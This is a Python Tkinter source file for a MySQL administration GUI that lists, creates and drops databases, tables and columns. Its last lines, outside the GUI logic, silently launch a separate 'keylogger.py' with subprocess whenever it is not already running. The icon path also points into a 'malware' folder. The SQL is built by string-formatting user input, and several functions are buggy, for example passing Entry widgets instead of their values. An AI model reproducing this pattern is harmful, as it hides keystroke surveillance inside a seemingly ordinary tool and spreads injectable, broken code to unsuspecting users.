#======================imports=======================#
import logging
from tkinter import *
import mysql.connector
from tkinter import messagebox
import tkinter as tk
import subprocess
import psutil

root = Tk() 
root.geometry('1035x550+500+220')
#root.resizable(False,False)
root.configure(background='#292D3E')
root.title('Lub [Database controlls v.1.1 SQL]')
root.iconbitmap('C:\\Users\\lub\\OneDrive\\Desktop\\All\\malware\\icon.ico')
title1 = Label(root,text=' Database controlls v.1.0 system',font=('Arial',15,'bold'),bg='#7D8594',fg='black')
title1.pack(fill=X)

def main():
    global is_F_visible
    global is_FFF1_visible
    global is_FFF2_visible
    global is_FFF_visible
    global is_FF_visible


    #======================copeying function=======================#
    def copy_selected(event, listbox):
        selected_items = listbox.curselection()
        if selected_items:
            selected_text = [listbox.get(index) for index in selected_items]
            root.clipboard_clear()
            root.clipboard_append('\n'.join(selected_text))
            logging.info("Text copied to clipboard: %s", ', '.join(selected_text))
    def copy_selected_right_click(event, listbox):
        print("Copy right click event triggered")
        selected_items = listbox.curselection()
        if selected_items:
            selected_text = [listbox.get(index) for index in selected_items]
            selected_text_as_strings = [str(item[0]) for item in selected_text]  # تحويل tuple إلى نص
            print("Selected text:", selected_text_as_strings)  # تسجيل النص المحدد للتحقق
            root.clipboard_clear()
            root.clipboard_append('\n'.join(selected_text_as_strings))
            logging.info("Text copied to clipboard: %s", ', '.join(selected_text))
    def paste(event, listbox):
        text = root.clipboard_get()
        if text:
            lines = text.split('\n')
            listbox.insert(END, *lines)
            logging.info(f"Text pasted: {', '.join(lines)}")
    #======================show databases function=======================#
    def show_DBS():
        global F
        global is_F_visible
        if not is_F_visible:
            import mysql.connector
            conn = mysql.connector.connect(
                        host=ENN1.get(),
                        user=ENN2.get(),
                        password=ENN3.get(),
                        
                        
            )
            mycur = conn.cursor()
            mycur.execute("SHOW DATABASES")

            F = Frame(root, bg='#1E212D', bd=2, relief=GROOVE)
            F.place(x=440, y=240, width=170, height=300)

            # إضافة Scrollbar
            scrollbar = Scrollbar(F)
            scrollbar.pack(side=RIGHT, fill=Y)

            # إنشاء قائمة لعرض قواعد البيانات مع الألوان ونوع الخط المماثل للثيم
            database_listbox = Listbox(F, yscrollcommand=scrollbar.set, bg='#1E212D', fg='whitesmoke',
                                    font=('Arial', 12, 'bold'))
            database_listbox.pack(fill=BOTH, expand=True)

            scrollbar.config(command=database_listbox.yview)

            title2 = Label(F, text='Databases Found', font=('Arial', 12, 'bold'), bg='#19282F', fg='whitesmoke', height=2)
            title2.pack(fill=X)

            for x in mycur:
                database_listbox.insert(END, x)  # إدراج البيانات في القائمة
                logging.info(f"Database found: {x[0]}")  # سجل اسم قاعدة البيانات

            # ارتبط Ctrl+C بدالة النسخ
            database_listbox.bind('<Control-c>', lambda event: copy_selected(event, database_listbox))
            database_listbox.bind('<Button-3>', lambda event: copy_selected_right_click(event, database_listbox))
            database_listbox.bind('<Control-v>', lambda event: paste(event, database_listbox))

            is_F_visible = True
    #======================DBconnect function=======================#
    logging.basicConfig(filename='app.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

    def DBconnect():
        host = ENN1.get()
        user = ENN2.get()
        passw = ENN3.get()
        try:
            conn = mysql.connector.connect(
                host=host,
                user=user,
                password=passw,
            )
            logging.info('Connection successful')  # تسجيل الأحداث هنا
            messagebox.showinfo('Message', 'Connection Successful')
        except mysql.connector.Error as r:
            logging.error(f'Error: {r}')  # تسجيل الأحداث هنا
            messagebox.showerror('Error', r)
    #======================create database function=======================#
    def DBcreate():
        db = EN1.get()
        try:
            conn = mysql.connector.connect(
                        host=ENN1.get(),
                        user=ENN2.get(),
                        password=ENN3.get(),
                        database=db,
            )
            mycur = conn.cursor()
            mycur.execute('CREATE DATABASE {}'.format(db))
            logging.info('Database created: {}'.format(db))
            messagebox.showinfo('Message', 'Database Created')
        except mysql.connector.Error as r:
            logging.error(f'Error: {r}')
            messagebox.showerror('Error', r)
    #======================create table and add column function=======================#
    def columns():
        global FF
        global Ent
        global Ent0
        global Ent1
        global Ent2
        global Ent3
        global is_FF_visible
        if not is_FF_visible:
            FF = Frame(root,bg='#1E212D',bd=2,relief=GROOVE)
            FF.place(x=5,y=240,width=215 ,height=300)
            title2=Label(FF,text='Table-Columns',font=('Arial',12,'bold'),bg='#19282F',fg='whitesmoke',height=2)
            title2.pack(fill=X)
            
            lab = Label(FF,text='DB-Name      : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab.place(x=2,y=50)
            Ent = Entry(FF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent.place(x=110,y=50,width=100, height=25)
            
            lab0 = Label(FF,text='Table-Name : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab0.place(x=2,y=80)
            Ent0 = Entry(FF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent0.place(x=110,y=80,width=100, height=25)
            
            lab1 = Label(FF,text='Col-Name     : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab1.place(x=2,y=110) 
            Ent1 = Entry(FF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent1.place(x=110,y=110,width=100, height=25) 
            
            lab2 = Label(FF,text='Col-Type      : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab2.place(x=2,y=140) 
            Ent2 = Entry(FF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent2.place(x=110,y=140,width=100, height=25) 
            
            lab3 = Label(FF,text='Col-Length  : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab3.place(x=2,y=170) 
            Ent3 = Entry(FF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent3.place(x=110,y=170,width=100, height=25) 
            
            b = Button(FF,text='Create Table And Add Column',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'),command=create_tabel)
            b.place(x=10,y=210 ,width=190, height=60)
            is_FF_visible = True
    #============= add column function =================#
    def columns1():
        global FFF
        global is_FFF_visible
        global Ent
        global Ent0
        global Ent1
        global Ent2
        global Ent3
        global is_FFF_visible
        if not is_FFF_visible:  
            FFF = Frame(root,bg='#1E212D',bd=2,relief=GROOVE)
            FFF.place(x=222,y=240,width=215 ,height=300)
            title2=Label(FFF,text='New Column',font=('Arial',12,'bold'),bg='#19282F',fg='whitesmoke',height=2)
            title2.pack(fill=X)
            
            lab = Label(FFF,text='DB-Name      : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab.place(x=2,y=50)
            Ent = Entry(FFF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent.place(x=110,y=50,width=100, height=25)
            
            lab0 = Label(FFF,text='Table-Name : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab0.place(x=2,y=80)
            Ent0 = Entry(FFF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent0.place(x=110,y=80,width=100, height=25)
            
            lab1 = Label(FFF,text='Col-Name     : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab1.place(x=2,y=110) 
            Ent1 = Entry(FFF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent1.place(x=110,y=110,width=100, height=25) 
            
            lab2 = Label(FFF,text='Col-Type      : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab2.place(x=2,y=140) 
            Ent2 = Entry(FFF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent2.place(x=110,y=140,width=100, height=25) 
            
            lab3 = Label(FFF,text='Col-Length  : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
            lab3.place(x=2,y=170) 
            Ent3 = Entry(FFF,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
            Ent3.place(x=110,y=170,width=100, height=25) 
            
            b = Button(FFF,text=' Add New Column',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'),command=add_column)
            b.place(x=10,y=210 ,width=190, height=60)
            is_FFF_visible = True
    #==================== create table function =================#    
    def create_tabel ():
        import mysql.connector
        from tkinter import messagebox
        db = Ent.get()
        tbname = Ent0.get()
        col_name = Ent1.get()
        col_type = Ent2.get()
        col_length = Ent3.get()
        
        try:
            conn = mysql.connector.connect(
                        host=ENN1,
                        user=ENN2,
                        password=ENN3,
                        database=db,
            )
            mycur = conn.cursor()
            mycur.execute('CREATE TABLE {} ({} {}({}))'.format(tbname, col_name, col_type, col_length))
            logging.info('Table created: {} - Columns: {}'.format(tbname, col_name))
            messagebox.showinfo('DB[system]', 'Table Created')
        except mysql.connector.Error as r:
            logging.error(f'Error: {r}')
            messagebox.showerror('Error', r)
    #======================create column function =======================#
    def add_column():
        import mysql.connector
        from tkinter import messagebox
        
        db = Ent.get()
        tbname = Ent0.get()
        col_name = Ent1.get()
        col_type = Ent2.get()
        col_length = Ent3.get()
        
        try:
            conn = mysql.connector.connect(
                        host=ENN1,
                        user=ENN2,
                        password=ENN3,
                        database=db,
            )
            mycur = conn.cursor()
            
            # يتحقق أولاً من وجود الجدول قبل إضافة الحقل
            mycur.execute(f"DESCRIBE {tbname}")
            table_columns = [column[0] for column in mycur.fetchall()]
            
            if col_name in table_columns:
                messagebox.showerror('Error', f'Column {col_name} already exists in the table')
            else:
                # إضافة الحقل الجديد باستخدام ALTER TABLE
                mycur.execute(f'ALTER TABLE {tbname} ADD COLUMN {col_name} {col_type}({col_length})')
                logging.info('New Column added: {} - Table: {}'.format(col_name, tbname))
                messagebox.showinfo('DB[system]', 'New Column Created')
            
        except mysql.connector.Error as r:
            logging.error(f'Error: {r}')
            messagebox.showerror('Error', r)
    #====================== hide function ==================#
    is_FF_visible = False
    is_FFF_visible = False
    is_F_visible = False
    is_FFF1_visible = False
    is_FFF2_visible = False
    def hide():
        global is_FF_visible
        if is_FF_visible:
            FF.place_forget()
            is_FF_visible = False

    # تعريف دالة للتحقق من حالة الإطار FFF وإخفائه
    def hide1():
        global is_FFF_visible
        if is_FFF_visible:
            FFF.place_forget()
            is_FFF_visible = False
    def hide_show_DBS():
        global F
        global is_F_visible
        if is_F_visible and F:
            F.place_forget()
            is_F_visible = False
    def hide2():
        global is_FFF1_visible
        if is_FFF1_visible:
            FFF1.place_forget()
            is_FFF1_visible = False
    def hide3():
        global is_FFF2_visible
        if is_FFF2_visible:
            FFF2.place_forget()
            is_FFF2_visible = False
    #================== test connect function ==================#
    def test_connection():
        host = ENN1.get()
        user = ENN2.get()
        passw = ENN3.get()
        
        try:
            conn = mysql.connector.connect(
                host=host,
                user=user,
                password=passw,
            )
            messagebox.showinfo('Message', 'Connection Successful')
            
            # سجل نجاح الاتصال
            logging.info(f'Successful connection to {host} as user {user}')
            
        except mysql.connector.Error as r:
            messagebox.showerror('Error', r)
            
            # سجل خطأ الاتصال
            logging.error(f'Error connecting to {host} as user {user}: {r}')
    #================== Frame ==================#        
    F1 = Frame(root,bg='#1E212D',bd=2,relief=GROOVE)
    F1.place(x=5,y=40,width=300 ,height=190)
    title2 = Label(F1,text=' Database controlls',font=('Arial',12,'bold'),bg='#19282F',fg='whitesmoke')
    title2.pack(fill=X)
    #========== show database ==============#
    L = Label(F1,text='Show DB  : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
    L.place(x=1,y=30)

    Button1 = Button(F1,text='All database',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'),command=show_DBS)
    Button1.place(x=100,y=30 ,width=125 , height=25)

    Button2 = Button(F1, text='Hide', bg='#19282F', fg='whitesmoke', cursor='hand2', font=('Arial', 9, 'bold'), command=hide_show_DBS)
    Button2.place(x=230, y=30, width=65, height=25)
    #============== DBname ==============#
    L1 = Label(F1,text='DB-Name  :  ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
    L1.place(x=1,y=60)

    EN1 = Entry(F1,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
    EN1.place(x=100,y=60,width=125, height=25)

    b1 = Button(F1,text='Create',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'), command= DBcreate)
    b1.place(x=230,y=60 ,width=65, height=25)
    #============== Table ===============#
    L2 = Label(F1,text='Table-cols : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
    L2.place(x=0,y=90)

    Button3 = Button(F1,text='Create Table',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold') , command=columns)
    Button3.place(x=100,y=90 ,width=125, height=25)

    Button4 = Button(F1,text='Hide',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'), command=hide)
    Button4.place(x=230,y=90 ,width=65, height=25)
    #============== Columns ===============#
    L3 = Label(F1,text='Add-Cols   : ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
    L3.place(x=0,y=120)

    Button3 = Button(F1,text='Add Columns',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'), command=columns1)
    Button3.place(x=100,y=120 ,width=125, height=25)

    Button4 = Button(F1,text='Hide',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'), command=hide1)
    Button4.place(x=230,y=120 ,width=65, height=25)
    #============== Frame 2 ===============#
    FF1 = Frame(root,bg='#1E212D',bd=2,relief=GROOVE)
    FF1.place(x=310,y=40,width=300 ,height=190)
    title2 = Label(FF1,text='Database Connect',font=('Arial',12,'bold'),bg='#19282F',fg='whitesmoke')
    title2.pack(fill=X)
    #============== Server ===============#
    LL1 = Label(FF1, text='Server Name  :  ', bg='#19282F', fg='whitesmoke', font=('Arial', 12, 'bold'))
    LL1.place(x=1, y=30)
    ENN1 = Entry(FF1, bg='#19282F', fg='whitesmoke', font=('Arial', 10, 'bold'))
    ENN1.place(x=125, y=30, width=117, height=25)

    def replace_with_localhost(event):
        if event.keysym == "Tab":
            current_text = ENN1.get()
            if current_text in ("l", "lo", "loc", "loca", "loacl","localh"):
                ENN1.delete(0, tk.END)  # حذف النص الحالي
                ENN1.insert(0, "localhost")
    # ربط الحدث عند الضغط على مفتاح
    ENN1.bind("<KeyPress>", replace_with_localhost)
    #============== User ===============#
    LL2 = Label(FF1,text='UserName      :  ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
    LL2.place(x=1,y=60)
    ENN2 = Entry(FF1,bg='#19282F',fg='whitesmoke',font=('Arial',10,'bold'))
    ENN2.place(x=125,y=60,width=117, height=25)

    def replace_with_root(event):
        if event.keysym == "Tab":
            current_text = ENN2.get()
            if current_text in ("r", "ro", "roo"):
                ENN2.delete(0, tk.END)  # حذف النص الحالي
                ENN2.insert(0, "root")
    # ربط الحدث عند الضغط على مفتاح
    ENN2.bind("<KeyPress>", replace_with_root)

    #============== Password ===============#
    LL3 = Label(FF1,text='Password       :  ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
    LL3.place(x=1,y=90)
    ENN3 = Entry(FF1,bg='#19282F',fg='whitesmoke',font=('Arial',10,'bold')) 
    ENN3.place(x=125,y=90,width=117 , height=25)
    #============== BTN-Connect ===============#
    btn_connect = Button(FF1,text='Connect',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'), command=DBconnect)
    btn_connect.place(x=242,y=30 ,width=55 , height=87)
    test_label = Label(FF1, text='Test To Connect The Server  ', bg='#19282F', fg='deepskyblue',font=('Arial', 12, 'bold'),cursor='hand2')
    test_label.place(x=1, y=150)
    test_label.bind('<Button-1>', lambda event: test_connection())
    #================= tabel =================#
    def show_tables():
        global FFF1
        global is_FFF1_visible
        if not is_FFF1_visible:
            db_name = ENN4.get()
            if db_name:
                try:
                    conn = mysql.connector.connect(
                        host=ENN1.get(),
                        user=ENN2.get(),
                        password=ENN3.get(),
                        database=db_name,
                    )
                    mycur = conn.cursor()
                    mycur.execute("SHOW TABLES")

                    FFF1 = Frame(root, bg='#1E212D', bd=2, relief=GROOVE)
                    FFF1.place(x=605, y=240, width=215, height=300)

                    title2 = Label(FFF1, text='Show Tables', font=('Arial', 12, 'bold'), bg='#19282F', fg='whitesmoke', height=2)
                    title2.pack(fill=X)

                    scrollbar = Scrollbar(FFF1)
                    scrollbar.pack(side=RIGHT, fill=Y)

                    table_listbox = Listbox(FFF1, yscrollcommand=scrollbar.set, bg='#1E212D', fg='whitesmoke', font=('Arial', 12, 'bold'))
                    table_listbox.pack(fill=BOTH, expand=True)

                    scrollbar.config(command=table_listbox.yview)

                    for x in mycur:
                        table_listbox.insert(END, x[0])
                        logging.info(f"Table found: {x[0]}")

                    delete_button = Button(FFF1, text="Drop Table", command=drop_table, bg='#19282F', fg='whitesmoke', font=('Arial', 10, 'bold'))
                    delete_button.pack(fill=X)

                    is_FFF1_visible = True
                except mysql.connector.Error as r:
                    logging.error(f'Error: {r}')
                    messagebox.showerror('Error', r)
            else:
                messagebox.showerror('Error', 'Please enter a database name')

    #================= DROP table function ==================#
    def drop_table():
        db_name = ENN4.get()
        table_name = ENN5.get()
        if not db_name or not table_name:
            messagebox.showerror('Error', 'Please enter DB and Table names')
            return

        confirmation = messagebox.askyesno('Confirm', f'Do you want to drop the table {table_name} from {db_name}?')
        if confirmation:
            try:
                conn = mysql.connector.connect(
                        host=ENN1.get(),
                        user=ENN2.get(),
                        password=ENN3.get(),
                        database=db_name,
                )
                mycur = conn.cursor()
                mycur.execute(f'DROP TABLE {table_name}')
                messagebox.showinfo('Success', f'Table {table_name} dropped successfully')
                table_listbox.delete(ANCHOR)  # Remove the table from the listbox
            except mysql.connector.Error as r:
                messagebox.showerror('Error', r)
    #================= drop column function ==================#
    def drop_column():
        db_name = ENN4.get()
        table_name = ENN5.get()
        column_name = columns_listbox.get(ANCHOR)

        if not db_name:
            messagebox.showerror('Error', 'Please enter DB name')
            return
        if not table_name:
            messagebox.showerror('Error', 'Please enter Table name')
            return
        if not column_name:
            messagebox.showerror('Error', 'Please select a column to drop')
            return

        try:
            conn = mysql.connector.connect(
                        host=ENN1.get(),
                        user=ENN2.get(),
                        password=ENN3.get(),
                        database=db_name,
            )
            mycur = conn.cursor()

            # Get the count of remaining columns in the table
            mycur.execute(f"SHOW COLUMNS FROM {table_name}")
            remaining_columns = mycur.fetchall()

            if len(remaining_columns) <= 1:
                messagebox.showerror('Error', 'You cannot delete the last column using ALTER TABLE; use DROP TABLE instead')
                return

            confirmation = messagebox.askyesno('Confirm', f'Do you want to drop the column {column_name} from {table_name} in {db_name}?')
            if confirmation:
                mycur.execute(f'ALTER TABLE {table_name} DROP COLUMN {column_name}')
                messagebox.showinfo('Success', f'Column {column_name} dropped successfully from {table_name}')
                columns_listbox.delete(ANCHOR)
        except mysql.connector.Error as r:
            messagebox.showerror('Error', r)
    #================= drop database =================#

    def drop_database():
        db_name = ENN4.get()

        if not db_name:
            messagebox.showerror('Error', 'Please enter DB name')
            return

        try:
            conn = mysql.connector.connect(
                        host=ENN1.get(),
                        user=ENN2.get(),
                        password=ENN3.get(),
                        database=db_name,
            )
            mycur = conn.cursor()

            confirmation = messagebox.askyesno('Confirm', f'Do you want to drop the database {db_name}?')
            if confirmation:
                mycur.execute(f'DROP DATABASE {db_name}')
                messagebox.showinfo('Success', f'Database {db_name} dropped successfully')
        except mysql.connector.Error as r:
            messagebox.showerror('Error', r)

    #================= def on_table_selected =================#
    def on_table_selected(event, listbox):
        selected_items = listbox.curselection()
        if selected_items:
            selected_text = listbox.get(selected_items[0])
            ENN5.delete(0, END)
            ENN5.insert(0, selected_text)

            load_columns(selected_text)
    #================= def load_columns =================#
    def load_columns(table_name):
        global columns_listbox
        columns_listbox.delete(0, END)  # مسح قائمة الأعمدة الحالية

        db_name = ENN4.get()
        if db_name and table_name:
            try:
                conn = mysql.connector.connect(
                        host=ENN1.get(),
                        user=ENN2.get(),
                        password=ENN3.get(),
                        database=db_name,
                )
                mycur = conn.cursor()
                mycur.execute(f"SHOW COLUMNS FROM {table_name}")

                for column in mycur:
                    columns_listbox.insert(END, column[0])
                    logging.info(f"Column found: {column[0]}")
            except mysql.connector.Error as r:
                logging.error(f'Error: {r}')
                messagebox.showerror('Error', r)
            
    #================= coumns =================#
    def Coumns4():
        global FFF2
        global is_FFF2_visible
        if not is_FFF2_visible:  
            db_name = ENN4.get()
            TB_name = ENN5.get()
            if db_name and TB_name:
                try:
                    conn = mysql.connector.connect(
                        host=ENN1.get(),
                        user=ENN2.get(),
                        password=ENN3.get(),
                        database=db_name,
                    )
                    mycur = conn.cursor()
                    mycur.execute(f"SHOW COLUMNS FROM {TB_name}")
                    
                    FFF2 = Frame(root, bg='#1E212D', bd=2, relief=GROOVE)
                    FFF2.place(x=820, y=240, width=215, height=300)
                    
                    title2 = Label(FFF2, text='Show columns', font=('Arial', 12, 'bold'), bg='#19282F', fg='whitesmoke', height=2)
                    title2.pack(fill=X)
                    
                    scrollbar = Scrollbar(FFF2)
                    scrollbar.pack(side=RIGHT, fill=Y)
                    
                    global columns_listbox
                    columns_listbox = Listbox(FFF2, yscrollcommand=scrollbar.set, bg='#1E212D', fg='whitesmoke', font=('Arial', 12, 'bold'))
                    columns_listbox.pack(fill=BOTH, expand=True)
                    
                    scrollbar.config(command=columns_listbox.yview)
                    
                    for column in mycur:
                        columns_listbox.insert(END, column[0])
                        logging.info(f"Column found: {column[0]}")
                    
                    delete_button = Button(FFF2, text="drop Column", command=drop_column, bg='#19282F', fg='whitesmoke', font=('Arial', 10, 'bold'))
                    delete_button.pack(fill=X)
                    
                    is_FFF2_visible = True
                except mysql.connector.Error as r:
                    logging.error(f'Error: {r}')
                    messagebox.showerror('Error', r)
            else:
                messagebox.showerror('Error', 'Please enter both DB and Table names')

    #=================Frame 3================#
    FF2 = Frame(root,bg='#1E212D',bd=2,relief=GROOVE)
    FF2.place(x=617,y=40,width=300 ,height=190)
    title2 = Label(FF2,text='Database Mangement',font=('Arial',12,'bold'),bg='#19282F',fg='whitesmoke')
    title2.pack(fill=X)
    LL4 = Label(FF2,text='Database Name: ',bg='#19282F',fg='whitesmoke',font=('Arial',12,'bold'))
    LL4.place(x=1,y=30,height=54)

    Button5 = Button(FF2,text='show',bg='#19282F',fg='whitesmoke', cursor='hand2', font=('Arial',9,'bold'), command=show_tables)
    Button5.place(x=245,y=30 ,width=50 , height=26)

    Button6 = Button(FF2, text='Hide', bg='#19282F', fg='whitesmoke', cursor='hand2', font=('Arial', 9, 'bold'), command=hide2)
    Button6.place(x=245, y=60, width=50, height=25)

    ENN4 = Entry(FF2,bg='#19282F',fg='whitesmoke',font=('Arial',9,'bold'))
    ENN4.place(x=125,y=30,width=117, height=54) 
    ###################################################################################################################################################
    LL5 = Label(FF2, text='Table Name        : ', bg='#19282F', fg='whitesmoke', font=('Arial', 12, 'bold'))
    LL5.place(x=0, y=90, height=50)

    LL6 = Label(FF2, text='column Name    : ', bg='#19282F', fg='whitesmoke', font=('Arial', 12, 'bold'))
    LL6.place(x=0, y=140, height=54)

    table_listbox = Listbox(FF2, bg='#1E212D', fg='whitesmoke', font=('Arial', 9, 'bold'))
    table_listbox.place(x=125, y=90, width=117, height=54)

    scrollbar = Scrollbar(table_listbox)
    scrollbar.pack(side=RIGHT, fill=Y)
    table_listbox.config(yscrollcommand=scrollbar.set)
    scrollbar.config(command=table_listbox.yview)

    ENN5 = Entry(FF2, bg='#19282F', fg='whitesmoke', font=('Arial', 9, 'bold'))
    ENN5.place(x=125, y=90, width=117, height=54)

    ENN6 = Entry(FF2, bg='#19282F', fg='whitesmoke', font=('Arial', 9, 'bold'))
    ENN6.place(x=125, y=148, width=117 , height=40)

    Button7 = Button(FF2, text='Show', bg='#19282F', fg='whitesmoke', cursor='hand2', font=('Arial', 9, 'bold'), command=Coumns4)
    Button7.place(x=245, y=90, width=50, height=26)

    Button8 = Button(FF2, text='Hide', bg='#19282F', fg='whitesmoke', cursor='hand2', font=('Arial', 9, 'bold'), command=hide3)
    Button8.place(x=245, y=120, width=50, height=25)

    Button9 = Button(FF2, text='Drop \n database', bg='#19282F', fg='whitesmoke', cursor='hand2', font=('Arial', 9, 'bold'), command=drop_database)
    Button9.place(x=245, y=150, width=55, height=35)

    # ارتبط النقر بزر الفأرة الأيسر بدالة عند تحديد عنصر من قائمة الجداول
    table_listbox.bind('<Button-1>', lambda event: on_table_selected(event, table_listbox))


    # ارتبط النقر بزر الفأرة الأيسر بدالة عند تحديد عنصر من قائمة الجداول
    table_listbox.bind('<Button-1>', lambda event: on_table_selected(event, table_listbox))

    root.mainloop()
    
  
if __name__ == '__main__':
    main()
program_name = "keylogger.py"

# التحقق مما إذا كان البرنامج قيد التشغيل بالفعل
for process in psutil.process_iter(['name']):
    if process.info['name'] == program_name:
        print(f"{program_name} is already running")
        break
else:
    # إذا لم يتم العثور على نسخة أخرى من البرنامج، قم بتشغيله
    subprocess.Popen(['python', program_name])
                

